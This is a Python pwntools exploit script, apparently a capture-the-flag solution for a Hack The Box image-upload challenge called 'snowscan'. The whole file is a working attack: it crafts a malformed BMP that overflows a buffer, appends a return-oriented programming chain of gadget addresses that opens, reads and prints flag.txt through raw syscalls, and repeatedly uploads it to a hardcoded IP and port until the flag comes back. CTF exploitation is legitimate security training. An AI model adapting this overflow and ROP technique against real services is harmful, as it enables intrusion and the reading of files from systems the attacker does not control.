

from pwn import *
import requests

HOST = '94.237.52.136'
PORT = 48416

# This is highly dependant on the stack that ASLR gives as we overwrite the pointer that we are using to write to data. So when you overwrite this pointer it is stack dependant
def create_payload():
  with open('dummy.bmp', 'rb') as fd:
    bmp = fd.read()
  
  bmp = bmp[:0x436] # strip out data
  bmp += b'a' * 0x2e0 # should be enough to overflow to our pointer0x430
  bmp += b'\x50' # set the last value
  bmp += b'\xb0' * 0x60 # reset the pointer value
  bmp += b'a' * 0x7 # replace rbp, and re-align

  # Scratch spaces
  data_scratch = 0x4c10e0

  # Useful gadgets, could optimize this more
  g_syscall = p64(0x41eb64)
  g_pop_rax = p64(0x4522e7)
  g_pop_rdi = p64(0x401a72)
  g_pop_rsi = p64(0x40f97e)
  g_pop_rdx = p64(0x40197f)
  g_ret = p64(0x401aa1)

  # Gadgets for moving data around
  g_mov_qword_rax_rdx = p64(0x476306)
  g_mov_rdi_rax = p64(0x467a62)

  # Start of ROP Chain, the key idea is to open flag.txt, read the data, and write it to stdout
  payload = b''.join([ 
    # Write flag.txt filename to scratch space
    g_pop_rax,
    p64(data_scratch),
    g_pop_rdx,
    b'flag.txt',
    g_mov_qword_rax_rdx,
    # Null terminate the string
    g_pop_rax,
    p64(data_scratch+8),
    g_pop_rdx,
    p64(0),
    g_mov_qword_rax_rdx,
    # Open flag.txt
    g_pop_rax,
    p64(2),
    g_pop_rdi,
    p64(data_scratch),
    g_pop_rsi,
    p64(0), # flag for read only
    g_syscall,

    # Read from flag.txt into buffer in data??
    g_mov_rdi_rax,
    g_pop_rax,
    p64(0),
    g_pop_rsi,
    p64(data_scratch),
    g_pop_rdx,
    p64(0x20),
    g_syscall,

    # Write the buffer data to stdout
    g_pop_rax,
    p64(1),
    g_pop_rdi,
    p64(1),
    g_syscall
  ])

  bmp += payload

  with open('payload.bmp', 'wb') as fd:
    fd.write(bmp)

def send_payload():
  url = 'http://{}:{}/snowscan'.format(HOST, str(PORT))
  file_path = './payload.bmp'
  
  resp = ''
  while "HTB" not in resp:
    with open(file_path, 'rb') as fd:
      files = {'file': fd}
      response = requests.post(url, files=files)
      resp = response.text

  print(resp)

def main():
  create_payload()
  send_payload()

if __name__ == '__main__':
  main()
